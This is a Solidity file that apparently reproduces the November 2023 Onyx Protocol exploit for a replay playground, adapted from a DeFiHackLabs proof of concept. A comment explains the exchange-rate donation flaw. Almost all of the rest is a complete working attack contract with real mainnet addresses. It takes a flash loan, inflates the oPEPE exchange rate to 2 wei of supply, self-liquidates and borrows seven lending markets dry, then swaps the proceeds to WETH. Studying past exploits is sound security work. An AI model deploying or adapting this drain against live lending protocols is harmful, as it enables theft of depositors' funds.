// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-11-OnyxProtocol).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `ContractTest` harness (`address(this)` is both the attacker and the Aave
// V3 flash-loan receiver -- `executeOperation` lives on the test itself),
// and only uses cheatcodes for fork setup / cosmetics: `vm.createSelectFork`,
// `vm.label`, `deal(address(this), 0)` / `deal(WETH, address(this), 0)`
// (both already true for a freshly-deployed contract) and
// `emit log_named_decimal_uint` (diagnostic only). None of those touch the
// profit path, so this file is a verbatim copy of the attack logic with
// only those cheatcode calls dropped (see docs/Troubleshooting-2.md §6).
//
// Root cause (Onyx Protocol, ~$2M, Nov 1 2023): Onyx is a Compound V2 fork.
// A cToken's exchangeRate = (cash + totalBorrows - totalReserves) /
// totalSupply, where `cash` is a plain `underlying.balanceOf(this)` read --
// so it counts any donated tokens, not just minted ones. There is no
// first-depositor / minimum-liquidity guard, so `oPEPE.mint(1e18)` then
// `oPEPE.redeem(totalSupply - 2)` shrinks totalSupply to 2 wei; donating the
// redeemed PEPE straight back via `PEPE.transfer(oPEPE, ...)` (no mint)
// explodes the exchange rate to ~1.26e30 PEPE per oPEPE-wei. Two wei of
// oPEPE now collateralizes essentially unlimited borrowing. The attacker
// recycles that fictitious collateral across oETHER, oUSDC, oUSDT, oPAXG,
// oDAI, oBTC and oLINK via `liquidateBorrow(borrower, 1, oPEPE)` +
// mint/redeem, borrowing each market dry, swapping everything to WETH on
// Uniswap V2, and repaying a 4,000+2 WETH Aave V3 flash loan -- neting
// 1,156.93 WETH (~$2M) with zero starting capital.

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IWETH {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function deposit() external payable;
}

interface IUSDC {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface ICErc20Delegate {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
    function getCash() external view returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral)
        external
        returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function underlying() external view returns (address);
}

interface ICrETH {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function liquidateBorrow(address borrower, address cTokenCollateral) external payable;
}

interface IComptroller {
    function liquidateCalculateSeizeTokens(
        address cTokenBorrowed,
        address cTokenCollateral,
        uint256 actualRepayAmount
    ) external view returns (uint256, uint256);

    function enterMarkets(
        address[] memory cTokens
    ) external returns (uint256[] memory);
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniRouterV2 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface IAaveFlashloanSimple {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// Entry point: plays the role of the DeFiHackLabs `ContractTest` (attacker
// EOA equivalent -- it is both the Aave flash-loan receiver and the holder
// of every intermediate balance). Every step below is copied verbatim from
// test/OnyxProtocol_exp.sol.
contract OnyxProtocolDrain {
    IAaveFlashloanSimple private constant AaveV3 = IAaveFlashloanSimple(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    IUSDC private constant USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant PAXG = IERC20(0x45804880De22913dAFE09f4980848ECE6EcbAf78);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    ICErc20Delegate private constant oPEPE = ICErc20Delegate(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
    ICErc20Delegate private constant oUSDC = ICErc20Delegate(0x8f35113cFAba700Ed7a907D92B114B44421e412A);
    ICErc20Delegate private constant oUSDT = ICErc20Delegate(0xbCed4e924f28f43a24ceEDec69eE21ed4D04D2DD);
    ICErc20Delegate private constant oPAXG = ICErc20Delegate(0x0C19D213e9f2A5cbAA4eC6E8eAC55a22276b0641);
    ICErc20Delegate private constant oDAI = ICErc20Delegate(0x830DAcD5D0a62afa92c9Bc6878461e9cD317B085);
    ICErc20Delegate private constant oBTC = ICErc20Delegate(0x1933f1183C421d44d531Ed40A5D2445F6a91646d);
    ICErc20Delegate private constant oLINK = ICErc20Delegate(0xFEe4428b7f403499C50a6DA947916b71D33142dC);
    ICrETH private constant oETHER = ICrETH(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79);
    IUniPairV2 private constant PEPE_WETH = IUniPairV2(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
    IUniPairV2 private constant USDC_WETH = IUniPairV2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniPairV2 private constant WETH_USDT = IUniPairV2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniPairV2 private constant PAXG_WETH = IUniPairV2(0x9C4Fe5FFD9A9fC5678cFBd93Aa2D4FD684b67C4C);
    IUniPairV2 private constant DAI_WETH = IUniPairV2(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    IUniPairV2 private constant WBTC_WETH = IUniPairV2(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940);
    IUniPairV2 private constant LINK_WETH = IUniPairV2(0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974);
    IUniRouterV2 private constant Router = IUniRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // step 0: take the 4,000 WETH Aave V3 flash loan. Everything from here
    // runs inside executeOperation (the Aave callback).
    function run() external {
        AaveV3.flashLoanSimple(address(this), address(WETH), 4000 * 1e18, bytes(""), 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        approveAll();
        (uint112 reservePEPE, uint112 reserveWETH,) = PEPE_WETH.getReserves();
        uint256 amountOut = calcAmountOut(reservePEPE, reserveWETH, WETH.balanceOf(address(this)));
        WETHToPEPE(amountOut);

        // oETHER -- first market: shrink oPEPE.totalSupply to 2 wei, donate
        // the redeemed PEPE, and self-liquidate a 1-wei oETHER debt against
        // the now-inflated oPEPE collateral (see IntermediateContractETH).
        IntermediateContractETH intermediateETH = new IntermediateContractETH();
        PEPE.transfer(address(intermediateETH), PEPE.balanceOf(address(this)));
        intermediateETH.start();
        oETHER.liquidateBorrow{value: 0.000000000000000001 ether}(address(intermediateETH), address(oPEPE));
        oPEPE.redeem(oPEPE.balanceOf(address(this)));
        WETH.deposit{value: address(this).balance}();

        // oUSDC
        {
            exploitToken(oUSDC);
            (uint112 reserveUSDC, uint112 reserveWETH1,) = USDC_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH1, reserveUSDC, USDC.balanceOf(address(this)));
            swapToWETH(IERC20(address(USDC)), amountOut);
        }

        // oUSDT
        {
            exploitToken(oUSDT);
            (uint112 reserveWETH2, uint112 reserveUSDT,) = WETH_USDT.getReserves();
            amountOut = calcAmountOut(reserveUSDT, reserveWETH2, USDT.balanceOf(address(this)));
            swapToWETH(IERC20(address(USDT)), amountOut);
        }

        // oPAXG
        {
            exploitToken(oPAXG);
            (uint112 reservePAXG, uint112 reserveWETH3,) = PAXG_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH3, reservePAXG, PAXG.balanceOf(address(this)));
            PAXGToWETH(amountOut);
        }

        // oDAI
        {
            exploitToken(oDAI);
            (uint112 reserveDAI, uint112 reserveWETH4,) = DAI_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH4, reserveDAI, DAI.balanceOf(address(this)));
            swapToWETH(DAI, amountOut);
        }

        // oBTC
        {
            exploitToken(oBTC);
            (uint112 reserveWBTC, uint112 reserveWETH5,) = WBTC_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH5, reserveWBTC, WBTC.balanceOf(address(this)));
            swapToWETH(WBTC, amountOut);
        }

        // oLink
        {
            exploitToken(oLINK);
            (uint112 reserveLINK, uint112 reserveWETH6,) = LINK_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH6, reserveLINK, LINK.balanceOf(address(this)));

            swapToWETH(LINK, amountOut);
        }

        // PEPE -- sweep every PEPE seized across all seven markets back to WETH.
        PEPEToWETH();

        WETH.approve(address(AaveV3), amount + premium);
        return true;
    }

    receive() external payable {}

    function WETHToPEPE(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(PEPE);
        Router.swapExactTokensForTokens(
            WETH.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    // Generalized replacement for the original test's USDCToWETH /
    // USDTToWETH / DAIToWETH / WBTCToWETH / LINKToWETH -- those five were
    // byte-for-byte identical apart from the token address, and duplicating
    // them (the compiler does not dedupe distinct functions) pushed this
    // contract's deployed bytecode over the EIP-170 24KB limit. Behavior is
    // unchanged: swap the caller's entire balance of `token` for WETH with
    // the same 1% slippage tolerance.
    function swapToWETH(
        IERC20 token,
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            token.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function PAXGToWETH(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(PAXG);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            PAXG.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function PEPEToWETH() internal {
        address[] memory path = new address[](2);
        path[0] = address(PEPE);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            PEPE.balanceOf(address(this)), 3_950_619_005_376_690_920_220, path, address(this), block.timestamp + 3600
        );
    }

    function approveAll() internal {
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        USDC.approve(address(oUSDC), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        USDT.approve(address(oUSDT), type(uint256).max);
        PAXG.approve(address(Router), type(uint256).max);
        PAXG.approve(address(oPAXG), type(uint256).max);
        DAI.approve(address(Router), type(uint256).max);
        DAI.approve(address(oDAI), type(uint256).max);
        WBTC.approve(address(Router), type(uint256).max);
        WBTC.approve(address(oBTC), type(uint256).max);
        LINK.approve(address(Router), type(uint256).max);
        LINK.approve(address(oLINK), type(uint256).max);
        PEPE.approve(address(Router), type(uint256).max);
    }

    function calcAmountOut(uint112 reserve1, uint112 reserve2, uint256 tokenBalance) internal pure returns (uint256) {
        uint256 a = (tokenBalance * 997);
        uint256 b = a * reserve1;
        uint256 c = (reserve2 * 1000) + a;
        return b / c;
    }

    // The empty-market donation primitive, re-run against each victim
    // market: shrink oPEPE.totalSupply to 2 wei, donate the redeemed PEPE
    // (exploding oPEPE's exchange rate), then self-liquidate a 1-wei debt
    // on `onyxToken` against that fictitious collateral and borrow it dry.
    function exploitToken(
        ICErc20Delegate onyxToken
    ) internal {
        IntermediateContractToken intermediateToken = new IntermediateContractToken();
        PEPE.transfer(address(intermediateToken), PEPE.balanceOf(address(this)));
        intermediateToken.start(onyxToken);
        onyxToken.liquidateBorrow(address(intermediateToken), 1, address(oPEPE));
        oPEPE.redeem(oPEPE.balanceOf(address(this)));
    }
}

// Copied verbatim (interface-adapted) from test/OnyxProtocol_exp.sol: mints
// oPEPE, redeems it down to 2 wei of totalSupply, donates the redeemed PEPE
// straight back to oPEPE (exploding its exchange rate -- the root-cause
// primitive), enters the oPEPE market, borrows oETHER's entire cash, forwards
// the borrowed ETH to the caller, then self-liquidates a 1-wei oETHER debt
// against the inflated oPEPE collateral and mints back the seized amount.
contract IntermediateContractETH {
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    ICErc20Delegate private constant oPEPE = ICErc20Delegate(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
    ICrETH private constant oETHER = ICrETH(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79);
    IComptroller private constant Unitroller = IComptroller(0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800);

    function start() external {
        PEPE.approve(address(oPEPE), type(uint256).max);
        oPEPE.mint(1e18);
        oPEPE.redeem(oPEPE.totalSupply() - 2);
        uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
        PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));

        address[] memory oTokens = new address[](1);
        oTokens[0] = address(oPEPE);
        Unitroller.enterMarkets(oTokens);
        oETHER.borrow(oETHER.getCash() - 1);

        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer ETH not successful");

        oPEPE.redeemUnderlying(redeemAmt);
        (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
        (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(address(oETHER), address(oPEPE), 1);
        uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
        oPEPE.mint(mintAmount);
        PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
    }

    receive() external payable {}
}

// Same primitive as IntermediateContractETH, generalized to any ERC-20
// Onyx market (oUSDC/oUSDT/oPAXG/oDAI/oBTC/oLINK): mint+redeem oPEPE down to
// 2 wei of totalSupply, donate the redeemed PEPE, borrow `onyxToken` dry,
// forward the underlying to the caller, then self-liquidate a 1-wei
// `onyxToken` debt against the inflated oPEPE collateral.
contract IntermediateContractToken {
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    ICErc20Delegate private constant oPEPE = ICErc20Delegate(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
    IUSDC private constant USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IComptroller private constant Unitroller = IComptroller(0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800);

    function start(
        ICErc20Delegate onyxToken
    ) external {
        PEPE.approve(address(oPEPE), type(uint256).max);
        oPEPE.mint(1e18);
        oPEPE.redeem(oPEPE.totalSupply() - 2);
        uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
        PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));

        address[] memory oTokens = new address[](1);
        oTokens[0] = address(oPEPE);
        Unitroller.enterMarkets(oTokens);
        onyxToken.borrow(onyxToken.getCash() - 1);

        if (onyxToken.underlying() == address(USDC)) {
            USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
        } else if (onyxToken.underlying() == address(USDT)) {
            USDT.transfer(msg.sender, USDT.balanceOf(address(this)));
        } else {
            IERC20(onyxToken.underlying()).transfer(msg.sender, IERC20(onyxToken.underlying()).balanceOf(address(this)));
        }

        oPEPE.redeemUnderlying(redeemAmt);
        (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
        (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(address(onyxToken), address(oPEPE), 1);
        uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
        oPEPE.mint(mintAmount);
        PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
    }

    receive() external payable {}
}
